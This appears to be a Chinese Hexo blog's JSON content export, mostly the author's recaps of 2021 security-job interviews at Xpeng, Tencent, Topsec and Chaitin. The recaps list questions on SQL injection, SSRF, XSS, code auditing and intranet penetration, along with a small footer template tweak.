aria-hidden=&quot;true&quot;&gt;&lt;/i&gt; &lt;span id=&quot;busuanzi_container_page_pv&quot;&gt; &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;0&lt;/span&gt; &lt;/span&gt; &lt;/span&gt;&lt;% &#125; %&gt; 修改首页左边栏底部消息 修改D:\\hexo\\themes\\pure\\layout\\common下的footer.ejs 123456789101112131415&lt;footer class=&quot;footer&quot; itemscope itemtype=&quot;http://schema.org/WPFooter&quot;&gt; &lt;%- partial(&#x27;_common/social&#x27;, null, &#123;cache: !config.relative_link&#125;) %&gt; &lt;% if (theme.pv.busuanzi.enable) &#123; %&gt; &lt;span class=&quot;article-read hidden-xs&quot;&gt; &lt;i class=&quot;icon icon-eye-fill&quot; aria-hidden=&quot;true&quot;&gt; &lt;a style=&quot;font-size: 12px;&quot;&gt; 总阅读量： &lt;/a&gt; &lt;/i&gt; &lt;span id=&quot;busuanzi_container_page_pv&quot;&gt; &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;0&lt;/span&gt; &lt;/span&gt; &lt;/span&gt; &lt;% &#125; %&gt;&lt;/footer&gt;","categories":[{"name":"学点东西","slug":"学点东西","permalink":"https://vvmdx.github.io/categories/%E5%AD%A6%E7%82%B9%E4%B8%9C%E8%A5%BF/"}],"tags":[{"name":"博客","slug":"博客","permalink":"https://vvmdx.github.io/tags/%E5%8D%9A%E5%AE%A2/"}]},{"title":"小鹏汽车","slug":"小鹏汽车","date":"2021-05-30T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/31/小鹏汽车/","link":"","permalink":"https://vvmdx.github.io/2021/05/31/%E5%B0%8F%E9%B9%8F%E6%B1%BD%E8%BD%A6/","excerpt":"","text":"小鹏汽车面试复盘 一面 时间：2021/05/31 17:00 时长：37分钟 自我介绍 有没有挖过src？ 平时web渗透怎么学的，有实战吗？有过成功发现漏洞的经历吗？ 做web渗透时接触过哪些工具 xxe漏洞是什么？ssrf是什么？ 打ctf的时候负责什么方向的题 为什么要搞信息安全，对安全这一块有多大的兴趣，以后会不会转行，还是打算一直从事安全方面工作 自己平时怎么学安全的，如果让你做一个新的方向（app安全），会投入多少时间去学习，还是说有自己想做的方向 聊一聊代码审计的流程 平时是怎么做代码审计的 有没有审计过开源框架、CMS？ 怎么判断一个数据库是mysql还是oracle的？ sql注入的种类，利用方式？ 聊一聊sql注入的原理及防御思路 做开发的时候用的是什么语言 做java开发的时候用过什么框架，能不能做java安全开发 有没有做过安卓开发 有没有用python写过工具？ msf利用的是哪个漏洞，有没有成功反弹？ 护网的时候主要做了些什么，聊一聊对安全产品的理解 公司现在需要做app安全的人，现在要你做的话，你会去学吗，或者说感兴趣吗，还是说有别的想做的，不想做app安全，能投入多少时间去学 内网渗透了解吗？聊一聊内网渗透的思路 总结：甲方面试，技术问题问的不是很多，很重视经历，包括src、实战渗透等，代码审计也提了建议说要去下载完整的源码做完整的审计，问了能不能做安全开发，因为可能需要开发一些sdk去给人做一个安全防护或者安全过滤，说了他们目前比较需要做app安全的人，问了对这一块感不感兴趣，会不会花时间去学","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]},{"title":"腾讯","slug":"腾讯","date":"2021-05-27T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/28/腾讯/","link":"","permalink":"https://vvmdx.github.io/2021/05/28/%E8%85%BE%E8%AE%AF/","excerpt":"","text":"腾讯面试复盘 一面 时间：2021/05/28 时长：15分钟 自我介绍 sql注入了解吗，讲一讲二次注入的原理 二次注入要怎么修复 sql注入过waf了解吗，若一个sql注入过滤了information关键词，怎么绕过 答了之前遇到一个ctf的题，禁用了information表的读取，最后通过截取字符串比对的方法爆出表名，但是没聊到正经的解决方法 还答了mysql版本 &lt; 5.0时没有information表 Redis未授权访问 渗透测试的一个完整流程 打ctf的时候有没有遇到什么印象特别深的题目 文件下载漏洞有没有什么比较好的利用方式 利用文件下载漏洞找文件名具体是找什么文件名（读取文件一般会读取哪些文件）（ctf中？实战中？） 命令执行漏洞，http不出网有什么比较好的处理方法（发散一点说） 接上一题，通过隧道通信，详细讲讲通过什么类型的隧道，讲讲具体操作 漏洞预警 有没有复现过中间件类型的漏洞（有没有完整的复现过漏洞） 在学校的攻防演练中扮演的角色的主要职责是什么","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]},{"title":"天融信","slug":"天融信","date":"2021-05-24T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/25/天融信/","link":"","permalink":"https://vvmdx.github.io/2021/05/25/%E5%A4%A9%E8%9E%8D%E4%BF%A1/","excerpt":"","text":"天融信面试复盘 时间：2021/05/25 时长：15~20分钟 有没有做过现实环境的渗透测试？有没有提交过src？ 对免杀技术了解多少，制作的木马能不能过360 ctf的成绩？擅长什么方向的题？ 攻防演练有什么成果？ shiro漏洞了解吗，讲一下原理 在linux下，现在有一个拥有大量ip地址的txt文本文档，但是里面有很多重复的，如何快速去重？ 在内网渗透中，通过钓鱼邮件获取到主机权限，但是发现内网拦截了tcp的出网流量，聊一下这个时候应该怎么进行通信？ 代码能力怎样，平时有没有做过代码审计？ 目前对什么方向感兴趣？ 总结：面试官介绍了很多天融信正在做的内容，包括打ctf、做木马免杀（杀软对抗）、安全服务（给甲方做渗透测试，甲方一般是电网这些国企），公司内研究二进制的人很少（包括打ctf的也没有pwn手）","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]},{"title":"长亭科技","slug":"长亭科技","date":"2021-05-23T16:00:00.000Z","updated":"2021-06-30T15:44:54.000Z","comments":true,"path":"2021/05/24/长亭科技/","link":"","permalink":"https://vvmdx.github.io/2021/05/24/%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80/","excerpt":"","text":"长亭科技面试复盘 一面 时间：2021/05/24 时长：30分钟 自我介绍 web渗透测试有没有过实战 没有，只有自己搭靶机测试过（其实后来想想应该提一下有参加过攻防演练的） 讲一下sql注入原理 原本程序要执行的代码拼接了用户输入的数据 有没有从代码层面了解过sql注入的成因（反问代码层面指的是不是sql语句，答是） 突然不知道怎么答，回答了一些注入时常用的方法和sql注入的种类（布尔盲注、报错注入、延时注入、联合查询、堆叠查询） 了不了解xss，有没有从代码层面了解xss的原理 答了反射型、存储型、DOM型xss，大概了解反射型和存储型怎么利用，代码看的不多 原理答了xss是一种代码注入漏洞，攻击者在网页中注入恶意代码后会导致用户浏览器在加载网页时执行恶意代码 对owasp top10漏洞哪个比较了解 注入 讲一讲怎么防御sql注入 过滤危险字符、转义 sql注入怎么绕过过滤 答了常见的绕过方法，宽字节、url编码、字节覆盖 问了hvv时**有没有成为靶标，有没有对攻击队行为做过研判 在**hvv时的工作内容，有没有做过流量包、数据包的研判 学校攻防演练时担任的角色，主要工作内容，渗透测试的思路，有什么成果（这个问的还是挺细的，具体到分配的任务、有没有拿下主机或者域控、攻防演练的形式和持续时间等都聊了） 平时ctf打的多不多，有什么成绩 平时会不会关注一些新颖的漏洞，会不会做代码审计，比如shiro漏洞等有没有做过漏洞复现 答了本科时是做开发的，代码基础较好，刚开始学，但是完整的审计还没做过 对钓鱼邮件这些有没有什么了解（因为上面聊京东护网时说了钓鱼邮件和微信钓鱼的事） 答了会用msf制作木马，做成office的宏木马，发word或者excel作为钓鱼邮件 目前学习的方向是什么 答了木马免杀技术、代码审计 最后聊了一下他们的人才需求，主要还是偏向代码审计，我就疯狂补充我本科是做开发的，代码基础还不错，对这个方向也感兴趣，然后马上就问了我开发过什么程序，有没有接触过安卓 答了做过web系统开发，安卓没做过，不过很多种编程语言都接触过，目前对代码审计还在学习阶段，因为打ctf的原因只了解一些php常见的高危函数，想去学习更深的东西 问我还有什么问题 二面 时间：2021/05/30 16:00 时长：34min 自我介绍 学代码审计偏哪个语言？擅长哪个语言 拿到一份php代码做审计，审计的流程大概是怎样的 对php开发框架熟吗？比如ThinkPHP这些 给的源码是ThinkPHP框架的话，审计起来和没有使用框架的有什么不同，从流程上或者从关注的点上有什么不同 php原生的敏感函数有哪些，比如搜关键字的话会搜哪些 反序列化漏洞了解吗 反序列的时候，unserialize()反序列一个字符串的时候，对象会有一些魔术方法会被自动调用到，在找反序列化的链时，有哪些魔术方法是可以作为一个入手点去找的 有没有审计过实际的项目，比如github上一些开源cms java审计可以聊一下吗 之前做渗透时有没有做过完整的项目，除了ctf 能不能说一些找到的漏洞，怎么找到的 ssrf这类的漏洞熟悉吗，说一下原理和利用方式 我们利用ssrf可以做什么，达到什么效果 在php环境下，怎么最大程度的利用ssrf，拿到shell或者进内网 怎么利用内网的机器请求内网中的服务 ssrf漏洞的修复建议，修复的时候需要注意哪些细节 如果用白名单策略修复ssrf，从用户输入的变量里拿出要访问的目标，这个要注意哪些，因为一些url会通过特殊的字符做白名单绕过，对取变量这个操作有哪些要注意的细节？ php中三个等号和两个等号有什么区别 php代码常见入口函数怎么找 有一些php的开发框架可以帮我们做一些url路由，对这些路由的方法熟悉吗 介绍下PHP的变量覆盖 有一个php的程序，本身就允许文件包含的操作，同时想要避免文件包含漏洞，写代码的时候要注意哪些 远程文件包含和本地文件包含，这两种涉及的php设置有什么 本地文件包含能不能通过php配置限制文件包含的路径（不通过代码直接通过配置项来解决） php、java代码审计对哪个漏洞特别熟悉 php在做sql注入防御时有哪些方法 java做sql注入的防御 sql的二次注入了解吗，能介绍一下吗 写代码的时候怎么防止二次注入 总结：全是问代码审计的，了解到是一面面试官说要问的，，后面问问题环节聊了下，主要工作内容也是做一些java代码审计的内容，这一块比较缺人 hr面 时间：2021/06/01 15:00 时长：13分钟 前两轮面试感觉怎样 面试官推荐你做java代码审计，可以接受吗 有没有做过完整的渗透测试 我看你本科是学计算机的，做开发的，读研为什么会想要做安全呢 有没有面试过别的公司，结果怎样 对乙方安全公司和甲方有什么看法，更想去哪工作 聊待遇、补贴等等","categories":[{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"},{"name":"学点东西","slug":"学点东西","permalink":"https://vvmdx.github.io/categories/%E5%AD%A6%E7%82%B9%E4%B8%9C%E8%A5%BF/"},{"name":"小工具&小脚本","slug":"小工具-小脚本","permalink":"https://vvmdx.github.io/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7-%E5%B0%8F%E8%84%9A%E6%9C%AC/"},{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"},{"name":"java代码审计","slug":"java代码审计","permalink":"https://vvmdx.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"找工作","slug":"找工作","permalink":"https://vvmdx.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"},{"name":"博客","slug":"博客","permalink":"https://vvmdx.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"自编工具&脚本","slug":"自编工具-脚本","permalink":"https://vvmdx.github.io/tags/%E8%87%AA%E7%BC%96%E5%B7%A5%E5%85%B7-%E8%84%9A%E6%9C%AC/"},{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"},{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://vvmdx.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java表达式引擎","slug":"java表达式引擎","permalink":"https://vvmdx.github.io/tags/java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E/"},{"name":"面试复盘","slug":"面试复盘","permalink":"https://vvmdx.github.io/tags/%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98/"}]}